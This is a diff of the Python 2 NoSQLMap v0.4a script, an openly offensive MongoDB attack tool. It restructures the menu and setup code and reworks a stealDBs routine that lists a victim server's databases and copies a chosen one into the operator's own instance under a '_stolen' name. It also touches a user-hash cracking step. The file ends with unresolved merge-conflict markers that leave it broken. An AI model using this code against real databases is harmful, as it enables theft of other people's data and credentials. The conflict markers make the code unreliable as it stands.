@@ -35,25 +35,29 @@ import re
 from hashlib import md5
 from threading import Thread
 
-#Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
-global optionSet
-optionSet = [False,False,False,False,False,False,False,False,False]
-global yes_tag
-global no_tag
-yes_tag = ['y', 'Y']
-no_tag = ['n', 'N']
-global victim
-global webPort
-global uri
-global httpMethod
-global https
-global myIP
-global myPort
-global verb
-global scanNeedCreds
-global dbPort
-dbPort = 27017
 
+def main():
+	signal.signal(signal.SIGINT, signal_handler)
+	global optionSet
+	#Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
+	optionSet = [False,False,False,False,False,False,False,False,False]
+	global yes_tag
+	global no_tag
+	yes_tag = ['y', 'Y']
+	no_tag = ['n', 'N']
+	global victim
+	global webPort
+	global uri
+	global httpMethod
+	global https
+	global myIP
+	global myPort
+	global verb
+	global scanNeedCreds
+	global dbPort
+	dbPort = 27017
+	mainMenu()
+	
 def mainMenu():
 	mmSelect = True
 	while mmSelect:
@@ -67,7 +71,7 @@ def mainMenu():
 		print "| |\  | (_) /\__/ /\ \/' / |____| |  | | (_| | |_) |"
 		print "\_| \_/\___/\____/  \_/\_\_____/\_|  |_/\__,_| .__/"
 		print "===================================================="
-		print "NoSQLMap-v0.4"
+		print "NoSQLMap-v0.4a"
 		print "nosqlmap@gmail.com"
 		print "\n"
 		print "1-Set options"
@@ -486,8 +490,11 @@ def netAttacks(target):
 				enumGrid(conn)
 			
 			if attack == "4":
-				print "\n"
-				stealDBs(myIP,conn)
+				if optionSet[4] == False:
+					print "Target database not set!"
+				else:
+					print "\n"
+					stealDBs(myIP,conn)
 			
 			if attack == "5":
 				print "\n"
@@ -1439,10 +1446,11 @@ def buildUri(origUri, randValue):
 	
 def stealDBs(myDB,mongoConn):
 	dbList = mongoConn.database_names()
+	dbLoot = True
 	menuItem = 1
 	if optionSet[4] == False:
-		raw_input("No destination database set! Press enter to return to the main menu.")
-		mainMenu()
+		raw_input("No destination database set! Press enter to return.")
+		return
 
 	if len(dbList) == 0:
 		print "Can't get a list of databases to steal.  The provided credentials may not have rights."
@@ -1452,22 +1460,20 @@ def stealDBs(myDB,mongoConn):
 		print str(menuItem) + "-" + dbName
 		menuItem += 1
 	
-	try:
+	while dbLoot:
 		dbLoot = raw_input("Select a database to steal:")
-	
-	except:
-		print "Invalid selection."
-		stealDBs(myDB)
+		
+		if int(dbLoot) > menuItem:
+			print "Invalid selection."
+		
+		else:
+			break
 		
 	try:
 		#Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
 		dbNeedCreds = raw_input("Does this database require credentials (y/n)? ")
 		
 		if dbNeedCreds in no_tag:
-			if optionSet[4] == False:
-				raw_input("No IP specified to copy to! Press enter to return to main menu...")
-				return
-			
 			myDBConn = pymongo.MongoClient(myDB,27017)
 			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)	
 		
@@ -1488,8 +1494,8 @@ def stealDBs(myDB,mongoConn):
 		else:
 			return
 	
-	except:
-		if str(sys.exc_info()).find('text search not enabled') != -1:
+	except Exception, e:
+		if str(e).find('text search not enabled') != -1:
 			raw_input("Database copied, but text indexing was not enabled on the target.  Indexes not moved.  Press enter to return...")
 			return
 		
@@ -1536,8 +1542,8 @@ def accessCheck(ip,port,pingIt):
 				conn.disconnect()
 				return [0,dbVer]
 		
-			except:
-				if str(sys.exc_info()).find('need to login') != -1:
+			except Exception, e:
+				if str(e).find('need to login') != -1:
 					conn.disconnect()
 					return [1,None]
 			
@@ -1979,7 +1985,7 @@ def getDBInfo():
 			menuItem +=1
 				
 		userIndex = raw_input("Select user hash to crack: ")
-		dict_pass(users[int(userIndex)-1],hashes[int(userIndex)-1])
+		passCrack(users[int(userIndex)-1],hashes[int(userIndex)-1])
 		
 		crackHash = raw_input("Crack another hash (y/n)?")		
 	raw_input("Press enter to continue...")
@@ -1991,5 +1997,10 @@ def signal_handler(signal, frame):
     print "CTRL+C detected.  Exiting."
     sys.exit()
 
+<<<<<<< HEAD
 signal.signal(signal.SIGINT, signal_handler)
 mainMenu()
+=======
+if __name__ == '__main__':
+	main()
+>>>>>>> 0.4
